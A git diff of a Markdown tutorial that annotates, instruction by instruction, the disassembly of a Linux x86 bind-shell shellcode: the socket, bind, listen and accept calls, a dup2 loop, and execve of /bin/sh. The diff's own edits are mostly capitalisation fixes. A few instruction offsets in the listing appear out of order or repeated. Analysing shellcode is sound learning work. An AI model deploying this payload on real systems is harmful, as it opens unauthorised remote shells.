@@ -189,6 +189,7 @@ Then, in the reverse order, the values of the above arguments are thrown onto th
 ```			
 ------------------------------------------------------------------------------------------------------------------------
 
+
 ### bind() ###
 ```nasm
 0000000F  5B                pop ebx 		
@@ -229,13 +230,14 @@ Then, bind() syscall will be called with the same method.
 00000019  51                push ecx
 ```
 - Pushing our sockfd pointer
+```nasm
 0000001A  50                push eax
 ```
 - Directing the stack pointer to bind() syscall arguments
 ```nasm
 0000001B  89E1              mov ecx,esp
 ```
-- Pushing call to socketcall syscall on top of the stack
+- Pushing call to socketcall() syscall on top of the stack
 ```nasm
 0000001D  6A66              push byte +0x66
 ```
@@ -248,6 +250,7 @@ Then, bind() syscall will be called with the same method.
 00000020  CD80              int 0x80
 ```
 ------------------------------------------------------------------------------------------------------------------------
+
 
 ### listen() ###
 
@@ -283,7 +286,7 @@ The next system call called is listen().
 0000002E  CD80              int 0x80 					
 ```
 
-The next system call called is accept (). Actions like before:
+The next system call called is accept(). Actions like before:
 - Incrementing EBX (accept() call = 5)
 ```nasm
 0000002B  43                inc ebx
@@ -317,15 +320,15 @@ Then three dup2() syscalls will be called. For this shellcode, a loop that is ex
 ```nasm
 00000031  59                pop ecx
 ```
-- push the value 63 on the stack
+- Push the value 63 on the stack
 ```nasm
 00000032  6A3F              push byte +0x3f
 ```
-- pop the value 63 to the EAX registry
+- Pop the value 63 to the EAX registry
 ```nasm
 00000034  58                pop eax
 ```
-- syscall execution
+- Syscall execution
 ```nasm
 00000035  CD80              int 0x80
 ```
@@ -333,7 +336,7 @@ Then three dup2() syscalls will be called. For this shellcode, a loop that is ex
 ```nasm
 00000037  49                dec ecx
 ```
-- loop operating dup2() system calls
+- Loop operating dup2() system calls
 ```nasm
 00000038  79F8              jns 0x32
 ```
@@ -351,35 +354,35 @@ Then three dup2() syscalls will be called. For this shellcode, a loop that is ex
 0000004C  CD80              int 0x80
 ```
 The last syscall will be execve(), which will run /bin/sh after connecting to the listening port
-- pushing value "//sh" on the stack (reverse order)
+- Pushing value "//sh" on the stack (reverse order)
 ```nasm
 0000003A  682F2F7368        push dword 0x68732f2f
 ```
-- pushing value "/bin" on the stack (reverse order)
+- Pushing value "/bin" on the stack (reverse order)
 ```nasm
 0000003F  682F62696E        push dword 0x6e69622f
 ```
-- we transfer the top of the stack address to the EBX registry
+- We transfer the top of the stack address to the EBX registry
 ```nasm
 00000044  89E3              mov ebx,esp
 ```
-- string terminator (null)
+- String terminator (null)
 ```nasm
 00000046  50                push eax
 ```
-- pushing previous stack pointer 
+- Pushing previous stack pointer 
 ```nasm
 00000047  53                push ebx
 ```
-- setting new stack pointer pointing our arguments
+- Setting new stack pointer pointing our arguments
 ```nasm
 00000048  89E1              mov ecx,esp
 ```
-- moving 11 (value of execve() syscall) to EAX
+- Moving 11 (value of execve() syscall) to EAX
 ```nasm
 0000004A  B00B              mov al,0xb
 ```
-- syscall execution
+- Syscall execution
 ```nasm
 0000004C  CD80              int 0x80
 ```
